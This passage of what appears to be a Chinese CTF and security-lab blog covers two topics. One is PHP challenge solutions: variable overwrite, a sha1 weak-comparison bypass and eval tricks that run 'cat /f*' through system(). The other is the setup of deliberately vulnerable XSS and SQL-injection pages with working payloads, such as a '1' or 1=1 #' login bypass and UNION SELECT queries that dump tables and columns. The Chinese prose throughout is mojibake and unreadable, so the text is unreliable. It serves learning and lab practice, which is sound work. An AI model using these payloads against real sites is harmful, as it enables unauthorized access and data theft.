${$key};è¿™é‡Œå­˜åœ¨ä¸¤ä¸ª$$ï¼Œæ‰€ä»¥å¯èƒ½å­˜åœ¨å˜é‡è¦†ç›–</p><p>if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) </p><p>$passwordçš„md5å€¼ä¸adminPassword,è¿™é‡Œå¯ä»¥åˆ©ç”¨å˜é‡è¦†ç›–ç»•è¿‡</p><p>password=111&amp;adminPassword=md(111)</p><p>sha1($verif)==$verifå¼±ç±»å‹æ¯”è¾ƒï¼Œä¹Ÿå¾ˆå®¹æ˜“ç»•è¿‡</p><p>sha1($a)=0exxx</p><p>åªè¦æ‰¾å‡º0eå¼€å¤´çš„å­—ç¬¦ä¸²çš„sha1å€¼ä¸º0eå¼€å¤´</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">for</span> ($i5 = <span class="hljs-number">0</span>; $i5 &lt;= <span class="hljs-number">9999999999</span>; $i5++) &#123;    $res = <span class="hljs-string">'0e'</span> . $i5;    <span class="hljs-comment">//0e1290633704</span>    <span class="hljs-keyword">if</span> ($res == hash(<span class="hljs-string">'sha1'</span>, $res)) &#123;        print_r($res);    &#125;&#125;</code></pre></div><p>æ‰€ä»¥verif=0e1290633704</p><p>é‡ç‚¹åœ¨è¿™</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (array_keys($GLOBALS) <span class="hljs-keyword">as</span> $key) &#123;        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="hljs-number">12</span>) &#123;            @<span class="hljs-keyword">eval</span>(<span class="hljs-string">"\$$key"</span> . <span class="hljs-string">'="'</span> . $GLOBALS[$key] . <span class="hljs-string">'";'</span>);        &#125;    &#125;</code></pre></div><ul><li>è¿™æ®µæ˜¯å°†è®¾ç½®varå¼€å¤´ï¼Œåé¢å¸¦1åˆ°2ä¸ªæ•°å­—å˜é‡çš„å€¼ï¼Œç±»ä¼¼äºvar1=xxxæˆ–è€…var12=xxx è¿™æ ·çš„</li><li>ç”±äºå˜é‡è¦†ç›–çš„ç¯èŠ‚é™åˆ¶äº†å•åŒå¼•å·çš„è¾“å…¥ï¼Œæ‰€ä»¥è¿™é‡Œçš„è§£æ³•ä¸ºåˆ©ç”¨phpå¤æ‚å˜é‡getshell</li></ul><p>ä»€ä¹ˆæ˜¯phpå¤æ‚å˜é‡getshell</p><p>PHPå¤æ‚å˜é‡</p><p>{}ä¸èƒ½è¢«è½¬ç§»ï¼Œå…¶åŒ…è£¹çš„éƒ¨åˆ†å¯å½“ä½œå˜é‡<br>å°±æ˜¯${phpinfo()}å’Œ{${phpinfo()}}æ˜¯ä¸€æ ·çš„ï¼ŒèŠ±æ‹¬å·{}åªæ˜¯ç”¨äºåŒºåˆ«å˜é‡è¾¹ç•Œçš„æ ‡è¯†ç¬¦</p><p>payload:</p><div class="hljs"><pre><code class="hljs dts">?source=<span class="hljs-number">1</span><span class="hljs-variable">&amp;</span>adminPassword=c4ca4238a0b923820dcc509a6f75849b<span class="hljs-variable">&amp;password</span>=<span class="hljs-number">1</span><span class="hljs-variable">&amp;verif</span>=<span class="hljs-number">0e1290633704</span><span class="hljs-variable">&amp;var1</span>=&#123;$_GET[<span class="hljs-number">1</span>]&#125;<span class="hljs-variable">&amp;var3</span>=$&#123;$var1()&#125;<span class="hljs-variable">&amp;1</span>=phpinfo<span class="hljs-comment">//var1=&#123;phpinfo&#125;  </span><span class="hljs-comment">//var3=$&#123;$var1&#125;=$&#123;phpinfo&#125;</span></code></pre></div><p>flagè—åœ¨phpinfoä¸­ï¼Œctrl+fæœç´ flagå³å¯</p><h2 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-comment">// flagåœ¨flag.php</span>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>]))&#123;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/\(.*\)/'</span>, $_GET[<span class="hljs-string">'a'</span>]))            <span class="hljs-keyword">die</span>(<span class="hljs-string">'hacker!!!'</span>);        ob_start(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">($data)</span></span>&#123;                 <span class="hljs-keyword">if</span> (strpos($data, <span class="hljs-string">'flag'</span>) !== <span class="hljs-keyword">false</span>)                 <span class="hljs-keyword">return</span> <span class="hljs-string">'ByeBye hacker'</span>;                 <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;                 &#125;);        <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'a'</span>]);    &#125; <span class="hljs-keyword">else</span> &#123;        highlight_file(<span class="hljs-keyword">__FILE__</span>);    &#125;    <span class="hljs-meta">?&gt;</span></code></pre></div><p>çœ‹ä¸‹ä»£ç </p><blockquote><p>1.get æäº¤ä¸€ä¸ªå‚æ•°a</p><p>2.æ­£åˆ™è¿‡æ»¤ï¼Œaä¸­ä¸èƒ½åŒ…å«ï¼ˆï¼‰</p><p>3.function($data)ï¼Œè¿™ä¸ªå‡½æ•°è¿‡æ»¤äº†flagå­—æ®µï¼Œæ‰€ä»¥è¡Œä¸šä¸èƒ½åŒ…å«flag</p><p>4.ç»•è¿‡ä¸Šé¢ä¸¤ä¸ªåå°±å¯ä»¥æ‰§è¡Œeval()</p></blockquote><p>å¯ä»¥ä½¿ç”¨echoé…åˆ``ç»•è¿‡ä¸Šé¢çš„æ£€æµ‹</p><div class="hljs"><pre><code class="hljs autohotkey">echo `base64 f*`;</code></pre></div><p>ä½†æ˜¯ä¸€èˆ¬æƒ³åˆ°çš„åº”è¯¥æ˜¯</p><div class="hljs"><pre><code class="hljs abnf">system(<span class="hljs-string">"cat /flag.php"</span>)<span class="hljs-comment">;</span></code></pre></div><p>å¯ä»¥åˆ©ç”¨%0aç»•è¿‡ï¼Œ%0aå¯¹åº”çš„asciiç ä¸ºæ¢è¡Œç¬¦ï¼Œå¹¶ä¸”ä¸ºbase64æ ¼å¼æ˜¾ç¤ºï¼Œä¸ç„¶ä¼šè¢«æ‹¦æˆª</p><div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=system(<span class="hljs-string">"%0acat /f*|%20base64"</span>)<span class="hljs-comment">;</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xsså’Œsqlæ³¨å…¥ç®€å•ç¯å¢ƒçš„æ­å»º</title>
    <link href="/2020/11/15/xss-sql/"/>
    <url>/2020/11/15/xss-sql/</url>
    
    <content type="html"><![CDATA[<h1 id="xsså’Œsqlæ³¨å…¥ç®€å•ç¯å¢ƒçš„æ­å»º"><a href="#xsså’Œsqlæ³¨å…¥ç®€å•ç¯å¢ƒçš„æ­å»º" class="headerlink" title="xsså’Œsqlæ³¨å…¥ç®€å•ç¯å¢ƒçš„æ­å»º"></a>xsså’Œsqlæ³¨å…¥ç®€å•ç¯å¢ƒçš„æ­å»º</h1><p>ä»¥ä¸‹ç¯å¢ƒéƒ½æ˜¯åŸºäºPHP studyæ­å»ºçš„ï¼Œç‰ˆæœ¬ä¸º php 5.5.38+Apache</p><a id="more"></a><p>å‚è€ƒäº†dvwaçš„æ¼æ´æºç ä¸æ”»å‡»æ–¹å¼ã€‚</p><h2 id="xssæ¼æ´çš„æ­å»º"><a href="#xssæ¼æ´çš„æ­å»º" class="headerlink" title="xssæ¼æ´çš„æ­å»º"></a>xssæ¼æ´çš„æ­å»º</h2><h3 id="1-ç½‘é¡µæºç "><a href="#1-ç½‘é¡µæºç " class="headerlink" title="1.ç½‘é¡µæºç "></a>1.ç½‘é¡µæºç </h3><div class="hljs"><pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;&lt;title&gt;xss&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;center&gt;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;h6&gt;please input your name!&lt;&#x2F;h6&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;input type&#x3D;&#39;submit&#39; value&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;?php  function SafeFilter (&amp;$arr) &#123;   $ra&#x3D;Array(&#39;&#x2F;([\x00-\x08,\x0b-\x0c,\x0e-\x19])&#x2F;&#39;,&#39;&#x2F;script&#x2F;&#39;,&#39;&#x2F;javascript&#x2F;&#39;,&#39;&#x2F;vbscript&#x2F;&#39;,&#39;&#x2F;expression&#x2F;&#39;,&#39;&#x2F;applet&#x2F;&#39;   ,&#39;&#x2F;meta&#x2F;&#39;,&#39;&#x2F;xml&#x2F;&#39;,&#39;&#x2F;blink&#x2F;&#39;,&#39;&#x2F;link&#x2F;&#39;,&#39;&#x2F;style&#x2F;&#39;,&#39;&#x2F;embed&#x2F;&#39;,&#39;&#x2F;object&#x2F;&#39;,&#39;&#x2F;frame&#x2F;&#39;,&#39;&#x2F;layer&#x2F;&#39;,&#39;&#x2F;title&#x2F;&#39;,&#39;&#x2F;bgsound&#x2F;&#39;   ,&#39;&#x2F;base&#x2F;&#39;,&#39;&#x2F;onload&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;,&#39;&#x2F;onchange&#x2F;&#39;,&#39;&#x2F;onsubmit&#x2F;&#39;,&#39;&#x2F;onreset&#x2F;&#39;,&#39;&#x2F;onselect&#x2F;&#39;,&#39;&#x2F;onblur&#x2F;&#39;,&#39;&#x2F;onfocus&#x2F;&#39;,   &#39;&#x2F;onabort&#x2F;&#39;,&#39;&#x2F;onkeydown&#x2F;&#39;,&#39;&#x2F;onkeypress&#x2F;&#39;,&#39;&#x2F;onkeyup&#x2F;&#39;,&#39;&#x2F;onclick&#x2F;&#39;,&#39;&#x2F;ondblclick&#x2F;&#39;,&#39;&#x2F;onmousedown&#x2F;&#39;,&#39;&#x2F;onmousemove&#x2F;&#39;   ,&#39;&#x2F;onmouseout&#x2F;&#39;,&#39;&#x2F;onmouseover&#x2F;&#39;,&#39;&#x2F;onmouseup&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;);        if (is_array($arr))   &#123;     foreach ($arr as $key &#x3D;&gt; $value)      &#123;        if (!is_array($value))        &#123;          if (!get_magic_quotes_gpc())  &#x2F;&#x2F;ä¸å¯¹magic_quotes_gpcè½¬ä¹‰è¿‡çš„å­—ç¬¦ä½¿ç”¨addslashes(),é¿å…åŒé‡è½¬ä¹‰ã€‚          &#123;             $value  &#x3D; addslashes($value); &#x2F;&#x2F;ç»™å•å¼•å·ï¼ˆ&#39;ï¼‰ã€åŒå¼•å·ï¼ˆ&quot;ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ä¸ NULï¼ˆNULL å­—ç¬¦ï¼‰  åŠ ä¸Šåæ–œçº¿è½¬ä¹‰          &#125;          $value       &#x3D; preg_replace($ra,&#39;&#39;,$value);     &#x2F;&#x2F;åˆ é™¤éæ‰“å°å­—ç¬¦ï¼Œç²—æš´å¼è¿‡æ»¤xsså¯ç–‘å­—ç¬¦ä¸²          $arr[$key]     &#x3D; htmlentities(strip_tags($value)); &#x2F;&#x2F;å»é™¤ HTML å’Œ PHP æ ‡è®°å¹¶è½¬æ¢ä¸º HTML å®ä½“        &#125;        else        &#123;          SafeFilter($arr[$key]);        &#125;     &#125;   &#125;&#125;&#x2F;&#x2F;phpé˜²æ³¨å…¥å’ŒXSSæ”»å‡»é€šç”¨è¿‡æ»¤$_POST    &amp;&amp; SafeFilter($_POST);if (isset($_POST[&#39;username&#39;]))&#123;$s&#x3D;$_POST[&#39;username&#39;];echo $s;&#125;?&gt;&lt;&#x2F;center&gt;&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre></div><p>ç½‘é¡µæºç ååˆ†ç®€å•ï¼Œå°±æ˜¯ç”¨æˆ·è¾“å…¥æ‰€è¦æŸ¥è¯¢çš„usernameï¼Œä¹‹åå°†å…¶è¾“å…¥çš„å†…å®¹æ‰“å°å‡ºæ¥ã€‚</p><p>èµ·åˆå¹¶æ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œå¤„ç†ï¼Œç›´æ¥æ‰§è¡Œäº†<code>echo</code>ï¼Œé€ æˆäº†xssæ¼æ´çš„å‡ºç°ã€‚</p><h3 id="2-æ”»å‡»æ•ˆæœ"><a href="#2-æ”»å‡»æ•ˆæœ" class="headerlink" title="2.æ”»å‡»æ•ˆæœ"></a>2.æ”»å‡»æ•ˆæœ</h3><p>åœ¨è¾“å…¥æ ä¸­è¾“å…¥ä»¥ä¸‹</p><div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">"xss"</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(/xsss/)</span>&gt;</span></code></pre></div><p><img src="https://i.loli.net/2020/11/12/4f6rKtjU8sg7IoT.png" srcset="/img/loading.gif" alt="xss.png"></p><p><img src="https://i.loli.net/2020/11/12/EAnVq5yv4ZWJo8z.png" srcset="/img/loading.gif" alt="xss1.png"></p><h3 id="3-æ¼æ´ä¿®å¤"><a href="#3-æ¼æ´ä¿®å¤" class="headerlink" title="3.æ¼æ´ä¿®å¤"></a>3.æ¼æ´ä¿®å¤</h3><p>ä¿®å¤æ¼æ´åªéœ€è¦å¯¹ç”¨æˆ·çš„è¾“å…¥å†…å®¹è¿›è¡Œæ£€æµ‹å’Œè¿‡æ»¤ï¼Œå¹¶å°†ä¸€äº›å¯èƒ½é€ æˆæ”»å‡»çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œè®©å…¶ä¸èµ·åˆ°åŸæœ¬çš„ä½œç”¨ã€‚</p><p>è¿‡æ»¤å‡½æ•°å¦‚ä¸‹</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SafeFilter</span> <span class="hljs-params">(&amp;$arr)</span> </span><span class="hljs-function"></span>&#123;   $ra=<span class="hljs-keyword">Array</span>(<span class="hljs-string">'/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/'</span>,<span class="hljs-string">'/script/'</span>,<span class="hljs-string">'/javascript/'</span>,<span class="hljs-string">'/vbscript/'</span>,<span class="hljs-string">'/expression/'</span>,<span class="hljs-string">'/applet/'</span>   ,<span class="hljs-string">'/meta/'</span>,<span class="hljs-string">'/xml/'</span>,<span class="hljs-string">'/blink/'</span>,<span class="hljs-string">'/link/'</span>,<span class="hljs-string">'/style/'</span>,<span class="hljs-string">'/embed/'</span>,<span class="hljs-string">'/object/'</span>,<span class="hljs-string">'/frame/'</span>,<span class="hljs-string">'/layer/'</span>,<span class="hljs-string">'/title/'</span>,<span class="hljs-string">'/bgsound/'</span>   ,<span class="hljs-string">'/base/'</span>,<span class="hljs-string">'/onload/'</span>,<span class="hljs-string">'/onunload/'</span>,<span class="hljs-string">'/onchange/'</span>,<span class="hljs-string">'/onsubmit/'</span>,<span class="hljs-string">'/onreset/'</span>,<span class="hljs-string">'/onselect/'</span>,<span class="hljs-string">'/onblur/'</span>,<span class="hljs-string">'/onfocus/'</span>,   <span class="hljs-string">'/onabort/'</span>,<span class="hljs-string">'/onkeydown/'</span>,<span class="hljs-string">'/onkeypress/'</span>,<span class="hljs-string">'/onkeyup/'</span>,<span class="hljs-string">'/onclick/'</span>,<span class="hljs-string">'/ondblclick/'</span>,<span class="hljs-string">'/onmousedown/'</span>,<span class="hljs-string">'/onmousemove/'</span>   ,<span class="hljs-string">'/onmouseout/'</span>,<span class="hljs-string">'/onmouseover/'</span>,<span class="hljs-string">'/onmouseup/'</span>,<span class="hljs-string">'/onunload/'</span>);        <span class="hljs-keyword">if</span> (is_array($arr))   &#123;     <span class="hljs-keyword">foreach</span> ($arr <span class="hljs-keyword">as</span> $key =&gt; $value) <span class="hljs-comment">//å¾ªç¯è¯­å¥ï¼ŒæŒ¨ä¸ªæ£€æµ‹</span>     &#123;        <span class="hljs-keyword">if</span> (!is_array($value))        &#123;          <span class="hljs-keyword">if</span> (!get_magic_quotes_gpc())           &#123;             $value  = addslashes($value); <span class="hljs-comment">//ç»™å•å¼•å·ï¼ˆ'ï¼‰ã€åŒå¼•å·ï¼ˆ"ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ä¸ NULï¼ˆNULL å­—ç¬¦ï¼‰  åŠ ä¸Šåæ–œçº¿è½¬ä¹‰</span>          &#125;          $value       = preg_replace($ra,<span class="hljs-string">''</span>,$value);     <span class="hljs-comment">//åˆ é™¤éæ‰“å°å­—ç¬¦</span>          $arr[$key]     = htmlentities(strip_tags($value)); <span class="hljs-comment">//å»é™¤ HTML å’Œ PHP æ ‡è®°å¹¶è½¬æ¢ä¸º HTML å®ä½“</span>        &#125;        <span class="hljs-keyword">else</span>        &#123;          SafeFilter($arr[$key]);        &#125;     &#125;   &#125;&#125;</code></pre></div><p><strong>å„ä¸ªå‡½æ•°åŠŸèƒ½å¦‚ä¸‹ï¼š</strong></p><p><strong>magic_quotes_gpc</strong>å‡½æ•°åœ¨phpä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æç¤ºçš„æ•°æ®ï¼Œå¦‚åŒ…æ‹¬æœ‰:postã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\â€ï¼Œä»¥ç¡®ä¿è¿™äº›æ•°æ®ä¸ä¼šå¼•èµ·ç¨‹åºï¼Œç‰¹åˆ«æ˜¯æ•°æ®åº“è¯­å¥å› ä¸ºç‰¹æ®Šå­—ç¬¦å¼•èµ·çš„æ±¡æŸ“è€Œå‡ºç°è‡´å‘½çš„é”™è¯¯</p><p>åœ¨magic_quotes_gpc=Onçš„æƒ…å†µä¸‹ï¼Œå¦‚æœè¾“å…¥çš„æ•°æ®æœ‰</p><p>å•å¼•å·ï¼ˆâ€™ï¼‰ã€åŒå¼•å·ï¼ˆâ€ï¼‰ã€åæ–œçº¿ï¼ˆï¼‰ä¸ NULï¼ˆNULL å­—ç¬¦ï¼‰ç­‰å­—ç¬¦éƒ½ä¼šè¢«åŠ ä¸Šåæ–œçº¿ã€‚</p><p><strong>addslasheså‡½æ•°</strong></p><p><img src="https://i.loli.net/2020/11/12/W7m2yOvok3g6ZXA.png" srcset="/img/loading.gif" alt="addslashes.png"></p><p><strong>htmlentities()</strong> å‡½æ•°æŠŠå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚</p><h2 id="gâ€™gsqlæ³¨å…¥ç¯å¢ƒæ­å»ºä¸æ”»å‡»"><a href="#gâ€™gsqlæ³¨å…¥ç¯å¢ƒæ­å»ºä¸æ”»å‡»" class="headerlink" title="gâ€™gsqlæ³¨å…¥ç¯å¢ƒæ­å»ºä¸æ”»å‡»"></a>gâ€™gsqlæ³¨å…¥ç¯å¢ƒæ­å»ºä¸æ”»å‡»</h2><p>ç½‘é¡µæºç ï¼Œæœ€å¸¸è§çš„ç™»å½•é¡µé¢ï¼Œå…¶ä¸­æ²¡æœ‰å¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œè¿‡æ»¤ï¼Œå°±å°†å…¶å¸¦å…¥sqlè¯­å¥ä¸­æŸ¥è¯¢é€ æˆäº†sqlæ³¨å…¥çš„å‡ºç°ã€‚</p><p>login.phpæºç </p><div class="hljs"><pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;&lt;html &gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;        &lt;title&gt;Sqli&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;body&gt;&lt;div class&#x3D;&quot;limiter&quot;&gt;    &lt;div class&#x3D;&quot;container-login100&quot;&gt;        &lt;div class&#x3D;&quot;wrap-login100 p-b-160 p-t-50&quot;&gt;            &lt;form class&#x3D;&quot;login100-form validate-form&quot; action&#x3D;&quot;check.php&quot; method&#x3D;&quot;post&quot;&gt;&lt;span class&#x3D;&quot;login100-form-title p-b-43&quot;&gt;Account Login&lt;&#x2F;span&gt;                &lt;div class&#x3D;&quot;wrap-input100 rs1 validate-input&quot; data-validate&#x3D;&quot;Username is required&quot;&gt;                    &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;                    &lt;span class&#x3D;&quot;label-input100&quot;&gt;Username&lt;&#x2F;span&gt;                &lt;&#x2F;div&gt;                &lt;div class&#x3D;&quot;wrap-input100 rs2 validate-input&quot; data-validate&#x3D;&quot;Password is required&quot;&gt;                    &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt;                    &lt;span class&#x3D;&quot;label-input100&quot;&gt;Password&lt;&#x2F;span&gt;                &lt;&#x2F;div&gt;                &lt;div class&#x3D;&quot;container-login100-form-btn&quot;&gt;                    &lt;button type&#x3D;&quot;submit&quot; class&#x3D;&quot;login100-form-btn&quot;&gt;                        Sign in                    &lt;&#x2F;button&gt;                &lt;&#x2F;div&gt;            &lt;&#x2F;form&gt;        &lt;&#x2F;div&gt;    &lt;&#x2F;a&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre></div><p>check.phpæºç </p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$pwd=$_POST[<span class="hljs-string">'password'</span>];$uname=$_POST[<span class="hljs-string">'username'</span>];$mysqli = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">'localhost'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'test'</span>);  <span class="hljs-comment">// æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåè¿™é‡Œä½¿ç”¨çš„æœ¬åœ°ä¸»æœºï¼Œå¯†ç ï¼Œä½¿ç”¨çš„æ•°æ®åº“å</span><span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;    printf(<span class="hljs-string">"fail:%s&lt;br&gt;"</span>,mysqli_connect_error());    <span class="hljs-keyword">exit</span>();&#125;$result = $mysqli-&gt;query(<span class="hljs-string">"select * from users where username='$uname' and password='$pwd'"</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;TABLE border=1,width=400&gt;"</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;"</span>;<span class="hljs-keyword">if</span>($row=mysqli_fetch_row($result))&#123;printf (<span class="hljs-string">"&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;"</span>,$row[<span class="hljs-number">1</span>],$row[<span class="hljs-number">2</span>]);       <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">"login success"</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"username or password error"</span>;&#125;<span class="hljs-comment">// echo "&lt;/TABLE&gt;";</span><span class="hljs-comment">// echo "&lt;/div&gt;";</span>$mysqli-&gt;close();$result-&gt;close();<span class="hljs-meta">?&gt;</span></code></pre></div><p>é€»è¾‘å¾ˆç®€å•ï¼Œåœ¨login.phpé¡µé¢æäº¤ç”¨æˆ·åå’Œå¯†ç ï¼Œå°†usernameå’Œpasswordå‘é€åˆ°check.phpé¡µé¢è¿æ¥æ•°æ®åº“æ£€æŸ¥ç”¨æˆ·æ˜¯å¦åˆæ³•ï¼Œç”¨æˆ·åå’Œå¯†ç éƒ½æ­£ç¡®åˆ™ï¼Œæ‰“å°å‡ºç”¨æˆ·åå’Œå¯†ç ã€‚</p><p>åœ¨æ•°æ®åº“å»ºç«‹äº†ä¸€å¼ userså’Œflagè¡¨ï¼Œä¾¿äºæ³¨å…¥ã€‚</p><p>è¡¨ä¸­çš„å†…å®¹å¦‚ä¸‹</p><p><img src="https://i.loli.net/2020/11/13/YACXPd9oOZvhfxN.png" srcset="/img/loading.gif" alt="sql1.png"></p><p><img src="https://i.loli.net/2020/11/13/oTqy8WhX6CGwS9A.png" srcset="/img/loading.gif" alt="sql2.png"></p><p><img src="https://i.loli.net/2020/11/13/ghDmGtqeQLCyNZz.png" srcset="/img/loading.gif" alt="sql3.png"></p><h3 id="1-æ¼æ´åˆ©ç”¨"><a href="#1-æ¼æ´åˆ©ç”¨" class="headerlink" title="1.æ¼æ´åˆ©ç”¨"></a>1.æ¼æ´åˆ©ç”¨</h3><p>ç›´æ¥ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»é™†</p><div class="hljs"><pre><code class="hljs makefile"><span class="hljs-section">username:1' or 1=1 #</span><span class="hljs-section">username:111</span></code></pre></div><p>ç»“æœæ‰“å°å‡ºäº†ç¬¬ä¸€ä¸ªç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç </p><p><img src="https://i.loli.net/2020/11/13/omqb2AzDvC4w69g.png" srcset="/img/loading.gif" alt="sql4.png"></p><p>è¿™ä¸ªç»“æœä¹Ÿè¯´åäº†æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œæ¥ä¸‹æ¥åˆ©ç”¨æ”¹æ³¨å…¥ç‚¹è·å–flag</p><h4 id="åˆ¤æ–­è¡¨æœ‰å‡ åˆ—"><a href="#åˆ¤æ–­è¡¨æœ‰å‡ åˆ—" class="headerlink" title="åˆ¤æ–­è¡¨æœ‰å‡ åˆ—"></a>åˆ¤æ–­è¡¨æœ‰å‡ åˆ—</h4><div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span>é¡µé¢æ˜¾ç¤ºæ­£å¸¸ï¼Œè€Œæ”¹ä¸º<span class="hljs-number">4</span>çš„æ—¶å€™ç½‘é¡µå‡ºç°æŠ¥é”™ï¼Œè¯´æ˜äº†åªæœ‰ä¸‰åˆ—<span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span><span class="hljs-comment">#</span></code></pre></div><h4 id="åˆ¤æ–­æ˜¾ç¤ºä½"><a href="#åˆ¤æ–­æ˜¾ç¤ºä½" class="headerlink" title="åˆ¤æ–­æ˜¾ç¤ºä½"></a>åˆ¤æ–­æ˜¾ç¤ºä½</h4><div class="hljs"><pre><code class="hljs gauss">' <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span><span class="hljs-meta">#</span></code></pre></div><p>è¯´æ˜æœ‰ä¸¤ä¸ªæ˜¾ç¤ºä½ï¼Œé€‰æ‹©å…¶ä¸­ä¸€ä¸ªä½ç½®è¿›è¡Œæ³¨å…¥å³å¯ã€‚</p><h4 id="è·å–è¡¨å"><a href="#è·å–è¡¨å" class="headerlink" title="è·å–è¡¨å"></a>è·å–è¡¨å</h4><div class="hljs"><pre><code class="hljs sql">' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.TABLES <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span></code></pre></div><p><img src="https://i.loli.net/2020/11/13/btQg6vFRZipUd1n.png" srcset="/img/loading.gif" alt="sql6.png"></p><h4 id="è·å–åˆ—å"><a href="#è·å–åˆ—å" class="headerlink" title="è·å–åˆ—å"></a>è·å–åˆ—å</h4><div class="hljs"><pre><code class="hljs sql">' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(COLUMN_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-keyword">where</span> TABLE_NAME=<span class="hljs-string">'flag'</span><span class="hljs-comment">#</span></code></pre></div><p><img src="https://i.loli.net/2020/11/13/KlwToCWSGiau4FM.png" srcset="/img/loading.gif" alt="sql7.png"></p><p>ï¼ˆfl4gæ˜¯dvwaå®éªŒä¸­å»ºç«‹æ²¡æœ‰åˆ é™¤ï¼Œæ‰€ä»¥ä¹Ÿæ˜¾ç¤ºå‡ºæ¥äº†ï¼‰</p><h4 id="è·å–flag"><a href="#è·å–flag" class="headerlink" title="è·å–flag"></a>è·å–flag</h4><div class="hljs"><pre><code class="hljs sql">' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(flag),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> 